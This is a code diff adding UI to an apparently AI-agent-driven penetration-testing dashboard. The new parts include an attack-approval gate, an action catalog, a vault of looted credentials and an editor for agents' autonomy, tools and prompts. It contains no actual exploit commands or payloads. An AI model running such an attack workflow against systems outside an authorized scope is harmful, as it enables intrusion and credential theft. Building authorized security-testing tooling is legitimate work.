@@ -156,6 +156,179 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
 .logpane .ln{color:var(--ink-2);white-space:pre-wrap;word-break:break-word}.logpane .ln .t{color:var(--muted);margin-right:8px}
 .logpane .ln.cmd{color:var(--accent)}.logpane .ln.p{color:var(--k-attack)}.logpane .ln.f{color:var(--k-finding)}.logpane .ln.c{color:var(--k-cred)}.logpane .ln.ok{color:var(--accent)}
 @media(max-width:820px){#app{grid-template-columns:1fr}.side{display:none}.map-body{grid-template-columns:1fr;grid-template-rows:1fr 180px}}
+
+/* ---- run-level tabs + panes ---- */
+.run-tabs{display:flex;gap:3px;padding:8px 18px 0;border-bottom:1px solid var(--line);flex-wrap:wrap;background:color-mix(in srgb,var(--bg-2) 45%,transparent)}
+.rtab{display:inline-flex;align-items:center;gap:7px;font:600 12.5px/1 var(--sans);color:var(--ink-2);background:none;border:1px solid transparent;border-bottom:0;border-radius:9px 9px 0 0;padding:9px 13px;cursor:pointer;position:relative;top:1px}
+.rtab:hover{color:var(--ink)}
+.rtab.on{color:var(--accent);background:var(--panel);border-color:var(--line-2);border-bottom-color:var(--panel)}
+.rtab .rc{font:700 10px/1 var(--mono);background:var(--sunk);border:1px solid var(--line-2);border-radius:20px;padding:2px 6px;color:var(--ink-2)}
+.rtab.on .rc{color:var(--accent);border-color:var(--accent)}
+.rtab .rc.warnc{color:var(--gold);border-color:color-mix(in srgb,var(--gold) 50%,var(--line-2))}
+.run-panes{flex:1;min-height:0;display:flex}
+.pane{flex:1;min-height:0;min-width:0;display:none;flex-direction:column}
+.pane.on{display:flex}
+.pane.scroll{overflow-y:auto;padding:20px 24px}
+.pane h2{font-size:17px;margin:0 0 3px}
+.pane .plead{color:var(--ink-2);font-size:12.5px;margin:0 0 16px}
+
+/* map 3-col: service tree | map | log */
+.map3{flex:1;display:grid;gap:12px;padding:12px 18px 16px;min-height:0;grid-template-columns:212px 1fr 340px}
+.map3.nolog{grid-template-columns:212px 1fr}
+.map3.notree{grid-template-columns:1fr 340px}
+.map3.notree.nolog{grid-template-columns:1fr}
+.svctree{overflow-y:auto;background:var(--sunk);border:1px solid var(--line);border-radius:11px;padding:9px 7px}
+.svctree .sh{font:700 9.5px/1 var(--mono);letter-spacing:.12em;text-transform:uppercase;color:var(--muted);padding:8px 8px 6px}
+.svctree .hostrow{display:flex;align-items:center;gap:7px;font:600 11.5px/1.3 var(--mono);color:var(--ink);padding:6px 8px;border-radius:7px;cursor:pointer}
+.svctree .hostrow:hover{background:var(--panel)}
+.svctree .hostrow .hi{color:var(--k-target)}
+.svctree .svc{display:flex;align-items:center;gap:8px;font:500 11px/1.3 var(--mono);color:var(--ink-2);padding:5px 8px 5px 16px;border-radius:7px;cursor:pointer;border-left:2px solid transparent;margin:1px 0 1px 8px}
+.svctree .svc:hover{background:var(--panel);color:var(--ink)}
+.svctree .svc.sel{background:color-mix(in srgb,var(--accent) 15%,var(--panel));color:var(--accent);border-left-color:var(--accent)}
+.svctree .svc .po{color:var(--accent);flex:0 0 auto}
+.svctree .svc .star{color:var(--gold);margin-left:auto;font-size:10px}
+
+/* drawer: actions + references */
+.node-drawer .sec-h{font:600 9.5px/1 var(--mono);letter-spacing:.12em;text-transform:uppercase;color:var(--muted);margin:12px 0 7px;border-top:1px solid var(--line);padding-top:10px;display:flex;align-items:center;gap:6px}
+.node-drawer .sec-h .cnt{margin-left:auto;color:var(--ink-2);font-size:9px;font-weight:400}
+.act{border:1px solid var(--line);border-radius:8px;padding:8px;margin-bottom:6px;background:var(--panel-2)}
+.act .al{display:flex;align-items:center;gap:5px;flex-wrap:wrap;margin-bottom:4px}
+.act .name{font:600 11px/1.3 var(--sans);color:var(--ink);flex:1 0 auto}
+.badge2{font:700 8px/1.5 var(--mono);text-transform:uppercase;letter-spacing:.03em;padding:1px 5px;border-radius:5px;border:1px solid var(--line-2);color:var(--ink-2);white-space:nowrap}
+.badge2.t1{color:var(--accent-2);border-color:color-mix(in srgb,var(--accent-2) 45%,var(--line-2))}
+.badge2.t2{color:var(--gold);border-color:color-mix(in srgb,var(--gold) 45%,var(--line-2))}
+.badge2.t3{color:var(--red);border-color:color-mix(in srgb,var(--red) 45%,var(--line-2))}
+.badge2.run{color:var(--k-target)} .badge2.copy{color:var(--k-report)}
+.badge2.star{color:var(--gold);border-color:var(--gold)} .badge2.port{color:var(--ink-2)}
+.act .cmd{font-family:var(--mono);font-size:9.5px;color:var(--accent);word-break:break-all;margin:4px 0;line-height:1.55}
+.act .ab{display:flex;gap:6px;align-items:center}
+.act .ab button{font:600 10px/1 var(--sans);border-radius:6px;padding:5px 10px;cursor:pointer;border:1px solid var(--line-2);background:var(--panel);color:var(--ink-2)}
+.act .ab button:hover{border-color:var(--accent);color:var(--accent)}
+.act .ab button.go{background:linear-gradient(180deg,var(--accent),var(--accent-2));color:var(--accent-ink);border-color:transparent}
+.act .ab button.go:hover{color:var(--accent-ink);filter:brightness(1.06)}
+.act .ab button.ran{color:var(--accent-2);border-color:color-mix(in srgb,var(--accent-2) 45%,var(--line-2));cursor:default}
+.act .src{font-family:var(--mono);font-size:8.5px;color:var(--muted);margin-left:auto}
+.ref-link{display:flex;align-items:center;gap:7px;font-family:var(--mono);font-size:10.5px;color:var(--k-target);text-decoration:none;padding:6px 8px;border-radius:7px;border:1px solid var(--line);margin-bottom:5px}
+.ref-link:hover{border-color:var(--k-target);background:var(--panel)}
+.ref-link.edb{color:var(--k-finding)} .ref-link.edb:hover{border-color:var(--k-finding)}
+.ref-link .ext{margin-left:auto;opacity:.6}
+
+/* findings + creds tables reuse .tbl; extra bits */
+.pbar{display:flex;align-items:center;gap:10px;margin-bottom:14px;flex-wrap:wrap}
+.tbl td .sev{cursor:default}
+.tbl .desc{color:var(--ink);white-space:normal;max-width:360px}
+.tbl .secret{color:var(--gold)}
+.rowlink{cursor:pointer}
+.miniref{color:var(--k-target);text-decoration:none} .miniref:hover{text-decoration:underline}
+
+/* attack gate */
+.gatecard{border:1px solid var(--line);border-radius:12px;padding:15px 17px;margin-bottom:12px;background:linear-gradient(180deg,var(--panel),var(--panel-2));border-left:3px solid var(--k-attack);max-width:760px}
+.gatecard.approved{border-left-color:var(--accent-2)}
+.gatecard.denied{border-left-color:var(--red);opacity:.72}
+.gatecard .gh{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:7px}
+.gatecard .gt{font:700 14px/1.2 var(--sans);color:var(--ink)}
+.gatecard .gmeta{font-family:var(--mono);font-size:11px;color:var(--ink-2);margin:2px 0}
+.gatecard .gmeta b{color:var(--ink)}
+.gatecard .gcmd{font-family:var(--mono);font-size:10.5px;color:var(--accent);background:var(--sunk);border:1px solid var(--line);border-radius:8px;padding:9px 11px;margin:9px 0;word-break:break-all}
+.gatecard .gb{display:flex;gap:8px}
+.gatecard .gb button{font:600 12px/1 var(--sans);border-radius:8px;padding:8px 15px;cursor:pointer;border:1px solid var(--line-2);background:var(--panel);color:var(--ink-2)}
+.gatecard .gb .approve{background:linear-gradient(180deg,var(--accent),var(--accent-2));color:var(--accent-ink);border-color:transparent}
+.gatecard .gb .approve:hover{color:var(--accent-ink);filter:brightness(1.06)}
+.gatecard .gb .deny:hover{color:var(--red);border-color:var(--red)}
+.gst{font:700 9px/1.5 var(--mono);text-transform:uppercase;letter-spacing:.06em;padding:2px 9px;border-radius:20px;margin-left:auto}
+.gst.pending{color:var(--gold);border:1px solid var(--gold)} .gst.approved{color:var(--accent-2);border:1px solid var(--accent-2)} .gst.denied{color:var(--red);border:1px solid var(--red)}
+.gate-banner{display:flex;align-items:center;gap:9px;font-family:var(--mono);font-size:11.5px;color:var(--gold);background:color-mix(in srgb,var(--gold) 8%,var(--panel));border:1px solid color-mix(in srgb,var(--gold) 35%,var(--line));border-radius:10px;padding:10px 13px;margin-bottom:16px;max-width:760px}
+
+/* catalog */
+.cat-head{display:flex;align-items:center;gap:16px;margin-bottom:14px;flex-wrap:wrap}
+.cat-stat{font-family:var(--mono);font-size:12px;color:var(--ink-2)} .cat-stat b{color:var(--accent);font-size:14px}
+.cat-svc{border:1px solid var(--line);border-radius:11px;margin-bottom:9px;overflow:hidden;max-width:960px}
+.cat-svc .csh{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--panel-2);font-family:var(--mono);font-size:12.5px;color:var(--ink)}
+.cat-svc .csh .cport{color:var(--accent);font-size:11px}
+.cat-svc .csh .ccat{color:var(--ink-2);font-size:10.5px;border:1px solid var(--line-2);border-radius:20px;padding:1px 8px}
+.cat-svc .csh .ccount{margin-left:auto;color:var(--muted);font-size:10.5px}
+.cat-act{display:flex;align-items:center;gap:10px;padding:8px 14px;border-top:1px solid var(--line);flex-wrap:wrap}
+.cat-act .can{font:600 11.5px/1.3 var(--sans);color:var(--ink);flex:0 0 210px}
+.cat-act .ccmd{font-family:var(--mono);font-size:9.5px;color:var(--accent);flex:1;min-width:150px;word-break:break-all}
+.cat-act .cgo{font:600 10px/1 var(--sans);border-radius:6px;padding:5px 11px;cursor:pointer;border:1px solid var(--line-2);background:var(--panel);color:var(--ink-2)}
+.cat-act .cgo:hover{border-color:var(--accent);color:var(--accent)}
+
+/* report */
+.report{max-width:820px;font-size:13.5px;line-height:1.7;color:var(--ink-2)}
+.report h1,.report h2,.report h3{color:var(--ink)}
+.report h1{font-size:22px;border-bottom:1px solid var(--line);padding-bottom:8px;margin:0 0 4px}
+.report h2{font-size:16px;margin-top:26px}
+.report h3{font-size:13.5px;margin-top:16px}
+.report .fm{font-family:var(--mono);font-size:11px;background:var(--sunk);border:1px solid var(--line);border-left:3px solid var(--accent);border-radius:8px;padding:12px 14px;color:var(--ink-2);white-space:pre-wrap;overflow-x:auto;margin:6px 0 14px}
+.report code{font-family:var(--mono);font-size:.85em;background:var(--sunk);border:1px solid var(--line);border-radius:5px;padding:1px 5px;color:var(--accent)}
+.report .callout{border-left:3px solid var(--gold);background:color-mix(in srgb,var(--gold) 7%,var(--panel));border-radius:8px;padding:10px 14px;margin:12px 0;font-size:12.5px}
+.report table{width:100%;border-collapse:collapse;margin:8px 0;font-family:var(--mono);font-size:11.5px}
+.report th{text-align:left;color:var(--muted);border-bottom:1px solid var(--line);padding:7px 9px;font-size:10px;text-transform:uppercase;letter-spacing:.06em}
+.report td{padding:7px 9px;border-bottom:1px solid var(--line);color:var(--ink-2)}
+.report ol,.report ul{padding-left:22px}
+.report .rbtns{display:flex;gap:9px;margin:2px 0 16px;flex-wrap:wrap}
+
+/* phone-style notification stack */
+.notes-stack{position:fixed;top:16px;right:16px;z-index:200;display:flex;flex-direction:column;gap:9px;width:320px;max-width:calc(100vw - 32px);pointer-events:none}
+.note-toast{pointer-events:auto;display:flex;align-items:flex-start;gap:10px;background:color-mix(in srgb,var(--panel) 97%,transparent);border:1px solid var(--line-2);border-left:3px solid var(--accent);border-radius:11px;padding:11px 13px;box-shadow:var(--shadow);backdrop-filter:blur(8px);animation:note-in .34s cubic-bezier(.2,.8,.2,1);transition:opacity .3s,transform .3s}
+.note-toast.out{opacity:0;transform:translateX(24px)}
+.note-toast .ni{font-size:15px;line-height:1.25;flex:0 0 auto}
+.note-toast .nt{font:600 12px/1.35 var(--sans);color:var(--ink)}
+.note-toast .nsub{font-family:var(--mono);font-size:10px;color:var(--ink-2);margin-top:2px;word-break:break-word}
+.note-toast.finding{border-left-color:var(--k-finding)} .note-toast.cred{border-left-color:var(--k-cred)}
+.note-toast.gate{border-left-color:var(--k-attack)} .note-toast.ok{border-left-color:var(--accent-2)} .note-toast.info{border-left-color:var(--accent)}
+@keyframes note-in{from{opacity:0;transform:translateX(30px)}to{opacity:1;transform:translateX(0)}}
+@media(max-width:820px){.map3,.map3.nolog,.map3.notree{grid-template-columns:1fr;grid-template-rows:auto 1fr 160px}.svctree{max-height:120px}}
+
+/* ---- agents ---- */
+.agent-layout{display:grid;grid-template-columns:272px 1fr;gap:18px;align-items:start}
+.agents-nav{background:var(--sunk);border:1px solid var(--line);border-radius:12px;padding:12px}
+.agentrow{display:flex;align-items:center;gap:8px;padding:7px 9px;border-radius:8px;cursor:pointer;font:500 12.5px/1.25 var(--sans);color:var(--ink-2);border-left:2px solid transparent}
+.agentrow:hover{background:var(--panel);color:var(--ink)}
+.agentrow.sel{background:color-mix(in srgb,var(--accent) 14%,var(--panel));color:var(--accent);border-left-color:var(--accent)}
+.agentrow .ai{width:18px;text-align:center;flex:0 0 auto}
+.agentrow.d1{margin-left:14px}.agentrow.d2{margin-left:28px}
+.agentrow .gated{margin-left:auto;font:700 8px/1.4 var(--mono);color:var(--k-attack);border:1px solid color-mix(in srgb,var(--k-attack) 45%,var(--line-2));border-radius:5px;padding:1px 5px}
+.orgwrap{background:linear-gradient(180deg,var(--panel),var(--panel-2));border:1px solid var(--line);border-radius:13px;padding:14px 16px;margin-bottom:16px}
+.orghead{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:4px}.orghead h3{margin:0;font-size:14px}
+.orgscroll{overflow-x:auto;padding:6px 0 2px}
+.tree{display:inline-block;min-width:100%}
+.tree ul{padding-top:20px;position:relative;display:flex;justify-content:center;margin:0}
+.tree li{list-style:none;position:relative;padding:20px 10px 0;text-align:center}
+.tree li::before,.tree li::after{content:"";position:absolute;top:0;right:50%;border-top:1.5px solid var(--line-2);width:50%;height:20px}
+.tree li::after{right:auto;left:50%;border-left:1.5px solid var(--line-2)}
+.tree li:only-child::after,.tree li:only-child::before{display:none}
+.tree li:only-child{padding-top:0}
+.tree li:first-child::before,.tree li:last-child::after{border:0 none}
+.tree li:last-child::before{border-right:1.5px solid var(--line-2)}
+.tree ul ul::before{content:"";position:absolute;top:0;left:50%;border-left:1.5px solid var(--line-2);width:0;height:20px}
+.onode{display:inline-flex;flex-direction:column;align-items:center;gap:2px;min-width:118px;background:var(--sunk);border:1px solid var(--line-2);border-radius:10px;padding:9px 12px;cursor:pointer;transition:.14s;vertical-align:top}
+.onode:hover{border-color:var(--accent);transform:translateY(-1px)}
+.onode.sel{border-color:var(--accent);box-shadow:var(--glow);background:color-mix(in srgb,var(--accent) 12%,var(--sunk))}
+.onode.root{border-color:var(--accent)}
+.onode.gated{border-color:color-mix(in srgb,var(--k-attack) 55%,var(--line-2))}
+.onode .oi{font-size:16px}.onode .onm{font:700 11px/1.15 var(--sans);color:var(--ink)}.onode .orl{font:500 9px/1.2 var(--mono);color:var(--muted)}
+.editor{background:linear-gradient(180deg,var(--panel),var(--panel-2));border:1px solid var(--line);border-radius:13px;padding:18px 20px}
+.editor .ehead{display:flex;align-items:center;gap:11px;flex-wrap:wrap;margin-bottom:3px}
+.editor .ehead .eic{font-size:22px}.editor .ehead h2{margin:0;font-size:18px}
+.editor .crumb2{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:16px}.editor .crumb2 b{color:var(--accent)}
+.egrid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:14px}
+.efield{display:flex;flex-direction:column;gap:5px}
+.efield>span{font:600 10px/1.3 var(--mono);letter-spacing:.09em;text-transform:uppercase;color:var(--muted)}
+.efield.full{grid-column:1/-1}
+.chips{display:flex;flex-wrap:wrap;gap:6px;align-items:center}
+.chip{display:inline-flex;align-items:center;gap:6px;background:var(--sunk);border:1px solid var(--line-2);border-radius:20px;padding:4px 10px;font:500 11px/1 var(--mono);color:var(--ink)}
+.chip .cx{cursor:pointer;color:var(--muted)}.chip .cx:hover{color:var(--red)}
+.toolgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(132px,1fr));gap:6px}
+.toolopt{display:flex;align-items:center;gap:7px;font:500 11px/1 var(--mono);color:var(--ink-2);background:var(--sunk);border:1px solid var(--line-2);border-radius:8px;padding:7px 9px;cursor:pointer}
+.toolopt.on{color:var(--accent);border-color:var(--accent);background:color-mix(in srgb,var(--accent) 12%,var(--sunk))}
+.toolopt .tk{width:13px;height:13px;border:1px solid var(--line-2);border-radius:4px;display:grid;place-items:center;font-size:9px;flex:0 0 auto}
+.toolopt.on .tk{background:var(--accent);border-color:var(--accent);color:var(--accent-ink)}
+.guard{display:flex;align-items:center;gap:8px;font:500 11px/1.5 var(--mono);color:var(--ink-2);padding:4px 0}.guard .lk{color:var(--gold);flex:0 0 auto}
+.eactions{display:flex;gap:10px;align-items:center;margin-top:8px;border-top:1px solid var(--line);padding-top:14px}
+select.input,textarea.input{width:100%}textarea.input{min-height:74px;resize:vertical;font-family:var(--mono);font-size:11px;line-height:1.5}
+.efield input[type=range]{width:100%;accent-color:var(--accent)}
+@media(max-width:820px){.agent-layout{grid-template-columns:1fr}.egrid{grid-template-columns:1fr}}
 </style>
 
 <!-- ============ LOGIN ============ -->
@@ -178,6 +351,7 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
     <div class="lbl">Workspace</div>
     <a data-view="feed" class="on"><span class="ic">◎</span> Feed <span class="badge">3</span></a>
     <a data-view="projects"><span class="ic">▤</span> Projects</a>
+    <a data-view="agents"><span class="ic">⬡</span> Agents</a>
     <a data-view="help"><span class="ic">?</span> Help</a>
     <a data-view="health"><span class="ic">✧</span> Health</a>
     <div class="lbl">Admin</div>
@@ -236,7 +410,17 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
             <li><b>Search</b> highlights matches; <b>▢ Region</b> groups the search matches into an annotated area.</li>
             <li><b>▶ Replay</b> re-plays the whole run from scratch.</li>
           </ul></div>
-        <div class="panel" style="max-width:760px"><h3>Safety</h3><p class="ink2" style="font-size:13px">Recon is automated; <b>attacks are never automatic</b>. Any spray/exploit is only ever <i>proposed</i> and must be approved by a human. Every target is checked against the project's authorized scope, and every action is audited.</p></div>
+        <div class="panel" style="max-width:760px;margin-bottom:12px"><h3>The run workspace</h3>
+          <ul class="ink2" style="font-size:13px;line-height:1.7">
+            <li><b>Service tree</b> (left) lists every discovered host + service; ★ marks a suggested action. Click to focus it on the map.</li>
+            <li>A node's drawer carries its <b>Actions</b> (the command builder — Run for attacker-side, Copy for victim-side, with tier + port + source) and its <b>References</b> (HackTricks + Exploit-DB).</li>
+            <li><b>Findings</b> — every parsed/entered finding, strongest-first, click-through to the map. <b>Credentials</b> — the looted vault, shown in full.</li>
+            <li><b>Attack gate</b> — agents propose exploitation checkpoints; you Approve / Deny. Nothing runs until you do.</li>
+            <li><b>Catalog</b> — the full 3,190-action decision-aid, ranked ★ against what this run found; filter or search it.</li>
+            <li><b>Report</b> — the Obsidian-compatible attack-path report, regenerate + export.</li>
+          </ul></div>
+        <div class="panel" style="max-width:760px;margin-bottom:12px"><h3>Agents</h3><p class="ink2" style="font-size:13px">The <b>Agents</b> tab shows the whole agent hierarchy — orchestrator → phase agents → sub-agents. Search for one or click it in the tree/chart to tweak its role, model, autonomy, techniques, tools and system prompt. Guardrails (scope-checking, the human attack-gate, audit) stay enforced and can't be edited off.</p></div>
+        <div class="panel" style="max-width:760px"><h3>Safety</h3><p class="ink2" style="font-size:13px">Recon is automated; <b>attacks are never automatic</b>. Any spray/exploit is only ever <i>proposed</i> and must be approved by a human at the gate. Every target is checked against the project's authorized scope, and every action is audited.</p></div>
       </section>
 
       <!-- HEALTH -->
@@ -282,6 +466,25 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
           <tbody id="usertb"></tbody></table>
       </section>
 
+      <!-- AGENTS -->
+      <section class="view" id="view-agents" hidden>
+        <h1>Agents</h1>
+        <p class="lead">The agent workforce that drives every run. Search for one, see exactly where it sits in the hierarchy, and tweak its role, model, techniques, tools and prompt — for special circumstances. Guardrails stay enforced.</p>
+        <div class="agent-layout">
+          <aside class="agents-nav">
+            <input class="input" id="agent-search" placeholder="🔎 search agents · roles · techniques…" style="margin-bottom:10px">
+            <div id="agent-list"></div>
+          </aside>
+          <div class="agents-main">
+            <div class="orgwrap">
+              <div class="orghead"><h3>Agent hierarchy</h3><span class="hint">orchestrator → phase agents → sub-agents · click any node to configure it</span></div>
+              <div class="orgscroll"><div class="tree" id="orgchart"></div></div>
+            </div>
+            <div id="agent-editor"></div>
+          </div>
+        </div>
+      </section>
+
       <!-- RUN / LIVE MAP -->
       <section class="view run" id="view-run" hidden>
         <div class="live-head">
@@ -291,6 +494,16 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
           <span class="legend" id="statelegend"></span>
         </div>
         <div class="phases" id="phases"></div>
+        <div class="run-tabs" id="run-tabs">
+          <button class="rtab on" data-pane="map">🕸 Map</button>
+          <button class="rtab" data-pane="findings">⚑ Findings <span class="rc" id="tc-find">0</span></button>
+          <button class="rtab" data-pane="gate">🛑 Attack gate <span class="rc warnc" id="tc-gate">0</span></button>
+          <button class="rtab" data-pane="catalog">📚 Catalog</button>
+          <button class="rtab" data-pane="creds">🔑 Credentials <span class="rc" id="tc-creds">0</span></button>
+          <button class="rtab" data-pane="report">📄 Report</button>
+        </div>
+        <div class="run-panes">
+        <div class="pane on" id="pane-map">
         <div class="map-controls">
           <button class="seg play" id="play">▶ Replay recon</button>
           <button class="seg" id="fit">⤢ Fit</button>
@@ -301,7 +514,8 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
           <button class="seg" id="region-mode">▢ Region</button>
           <span style="margin-left:auto" class="hint">click a node → detail + path · shift-click 2 → path A→B · dbl-click → note</span>
         </div>
-        <div class="map-body" id="mapbody">
+        <div class="map3" id="mapbody">
+          <aside class="svctree" id="svctree"></aside>
           <div class="mapcol">
             <div id="cy"></div>
             <div class="regions" id="regions" style="position:absolute;inset:0;overflow:hidden;pointer-events:none;z-index:3;border-radius:11px"></div>
@@ -313,6 +527,8 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
               <div class="ds"><span class="d" id="d-dot"></span><span id="d-state"></span></div>
               <div class="meta" id="d-path"></div>
               <div class="rows" id="d-rows"></div>
+              <div id="d-actions"></div>
+              <div id="d-refs"></div>
               <div class="note-sec"><span class="lab">📌 note</span>
                 <textarea id="d-note" placeholder="add a note on this node…"></textarea>
                 <div class="nb"><button class="save" id="d-note-save">Save</button><button id="d-note-del">Delete</button></div>
@@ -331,11 +547,39 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
           </div>
           <div class="logpane" id="logpane"><div class="lead">live action log</div></div>
         </div>
+        </div><!-- /pane-map -->
+        <div class="pane scroll" id="pane-findings">
+          <h2>Findings</h2><p class="plead">Everything the run has parsed or the operator entered — strongest first. Click a row to open it on the map.</p>
+          <div class="pbar"><input class="search" id="find-filter" placeholder="filter findings…" style="min-width:200px"><button class="btn" id="find-add">＋ Add finding</button><span class="hint" id="find-count"></span></div>
+          <div id="findbody"></div>
+        </div>
+        <div class="pane scroll" id="pane-gate">
+          <h2>Attack gate</h2><p class="plead">Agents <em>propose</em> attacks into checkpoints — nothing runs until a human approves. Every target is scope-checked and audited.</p>
+          <div class="gate-banner">🛑 Attacks are never automatic. You are the guardrail — approve or deny each proposed action.</div>
+          <div id="gatebody"></div>
+        </div>
+        <div class="pane scroll" id="pane-catalog">
+          <h2>Action catalog</h2><p class="plead">The full decision-aid catalogue, ranked against what this run actually found. ★ = suggested for this target.</p>
+          <div class="cat-head"><span class="cat-stat"><b>183</b> services</span><span class="cat-stat"><b>3,190</b> catalogued actions</span><span class="cat-stat"><b id="cat-sugg">0</b> ★ suggested here</span></div>
+          <div class="pbar"><input class="search" id="cat-filter" placeholder="search services · actions · commands…" style="min-width:240px"><button class="seg" id="cat-star">★ Suggested only</button><span class="hint" id="cat-shown"></span></div>
+          <div id="catbody"></div>
+        </div>
+        <div class="pane scroll" id="pane-creds">
+          <h2>Credentials</h2><p class="plead">Looted secrets for this engagement — shown in full (your own authorized target). Feeds authenticated re-runs across services.</p>
+          <div class="pbar"><button class="btn" id="cred-add">＋ Add credential</button><span class="hint" id="cred-count"></span></div>
+          <div id="credbody"></div>
+        </div>
+        <div class="pane scroll" id="pane-report">
+          <div class="rbtns"><button class="btn btn-primary" id="rep-md">⬇ Export report.md</button><button class="btn" id="rep-obs">Open in Obsidian vault</button><button class="btn" id="rep-regen">↻ Regenerate</button></div>
+          <div id="reportbody" class="report"></div>
+        </div>
+        </div><!-- /run-panes -->
       </section>
 
     </div>
   </div>
 </div>
+<div class="notes-stack" id="notes-stack"></div>
 <div id="regionstyle"></div>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/cytoscape/3.30.0/cytoscape.min.js"></script>
@@ -345,7 +589,7 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
   var reduce = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
 
   /* ---------------- app router + shell ---------------- */
-  var CRUMB = { feed:"Workspace · <b>Feed</b>", projects:"Workspace · <b>Projects</b>", help:"<b>Help</b>",
+  var CRUMB = { feed:"Workspace · <b>Feed</b>", projects:"Workspace · <b>Projects</b>", agents:"Workspace · <b>Agents</b>", help:"<b>Help</b>",
     health:"<b>Health</b>", llm:"Admin · <b>LLM setup</b>", users:"Admin · <b>Users</b>", run:"<b>Live run</b>", project:"<b>Project</b>" };
   var mapInited = false, CUR = "feed";
   function route(view, ctx){
@@ -356,6 +600,7 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
     document.getElementById("crumb").innerHTML = ctx || CRUMB[view] || "";
     document.getElementById("content").scrollTop = 0;
     if(view==="run"){ if(!mapInited){ initMap(); mapInited = true; } else setTimeout(function(){ if(cy){ cy.resize(); cy.fit(cy.elements(),40); } }, 40); }
+    if(view==="agents"){ initAgents(); }
   }
   Array.prototype.forEach.call(document.querySelectorAll(".side a[data-view]"), function(a){
     a.addEventListener("click", function(){ route(a.getAttribute("data-view")); });
@@ -365,7 +610,15 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
   document.getElementById("logout").addEventListener("click", function(){
     document.getElementById("app").hidden = true; document.getElementById("login").hidden = false; });
 
-  function toast(msg){ var t=document.createElement("div"); t.className="toast"; t.textContent=msg; document.body.appendChild(t); setTimeout(function(){ t.remove(); }, 2200); }
+  function pop(title, sub, kind){ var stack=document.getElementById("notes-stack"); if(!stack) return;
+    var icon={finding:"⚑",cred:"🔑",gate:"🛑",ok:"✓",info:"◎"}[kind]||"◎";
+    var t=document.createElement("div"); t.className="note-toast "+(kind||"info");
+    t.innerHTML='<span class="ni">'+icon+'</span><div><div class="nt"></div>'+(sub?'<div class="nsub"></div>':'')+'</div>';
+    t.querySelector(".nt").textContent=title; if(sub) t.querySelector(".nsub").textContent=sub;
+    stack.appendChild(t); while(stack.children.length>5) stack.removeChild(stack.firstChild);
+    setTimeout(function(){ t.classList.add("out"); setTimeout(function(){ if(t.parentNode) t.remove(); }, 340); }, 3400); }
+  function toast(msg){ pop(msg, "", "info"); }
+  function copyText(txt){ try{ if(navigator.clipboard&&navigator.clipboard.writeText){ navigator.clipboard.writeText(txt); } else { var ta=document.createElement("textarea"); ta.value=txt; ta.style.position="fixed"; ta.style.opacity="0"; document.body.appendChild(ta); ta.select(); document.execCommand("copy"); ta.remove(); } }catch(e){} pop("Copied to clipboard","","info"); }
 
   /* ---- feed + projects data ---- */
   var RUNS = [
@@ -596,7 +849,7 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
     setInterval(function(){ if(reduce||!cy) return; var act=cy.$('node[state="active"]'); if(!act.length) return;
       act.animate({style:{"overlay-padding":15,"overlay-opacity":0.30}},{duration:780,easing:"ease-in-out-sine",complete:function(){ act.animate({style:{"overlay-padding":6,"overlay-opacity":0.14}},{duration:780}); }}); }, 1700);
 
-    wireControls(); rebuildRegions(); renderRest();
+    wireControls(); wireRunTabs(); wirePaneButtons(); rebuildRegions(); renderRest(); renderCatalog();
     if(window.ResizeObserver){ var _r; new ResizeObserver(function(){ clearTimeout(_r); _r=setTimeout(function(){ if(cy){ cy.resize(); positionRegions(); } },120); }).observe(document.getElementById("cy")); }
   }
 
@@ -625,7 +878,7 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
   function showDrawer(node){ drawerId=node.id(); var st=node.data("state");
     document.getElementById("d-kind").textContent=node.data("kind"); document.getElementById("d-label").textContent=node.data("label"); document.getElementById("d-state").textContent=st;
     var dot=document.getElementById("d-dot"); dot.style.background=STATE_COLOR[st]||"#8394a0"; dot.style.color=STATE_COLOR[st]||"#8394a0";
-    renderRows(node.id()); document.getElementById("d-note").value=NOTES[node.id()]||""; document.getElementById("drawer").hidden=false; }
+    renderRows(node.id()); renderDrawerExtras(node.id()); markTreeSel(node.id()); document.getElementById("d-note").value=NOTES[node.id()]||""; document.getElementById("drawer").hidden=false; }
   function hideDrawer(){ drawerId=null; document.getElementById("drawer").hidden=true; }
   function setDrawerPath(h){ document.getElementById("d-path").textContent=h>0?("attack path: "+h+" hop"+(h===1?"":"s")+" from the entry"):""; }
 
@@ -641,9 +894,9 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
 
   function renderRest(){ cy.elements().remove(); clearLog(); running=false; curPhase="Done"; selId=null;
     NODES.forEach(function(n){ addNode(n[0],false); }); BEATS.forEach(function(b){ setState(b.state); }); BEATS.forEach(function(b){ (b.log||[]).forEach(logLine); });
-    cy.nodes().forEach(function(n){ n.data("state","done"); }); renderPhases(); renderLegend(); layout(layoutName); }
+    cy.nodes().forEach(function(n){ n.data("state","done"); }); renderPhases(); renderLegend(); layout(layoutName); buildServiceTree(); refreshPanes(); }
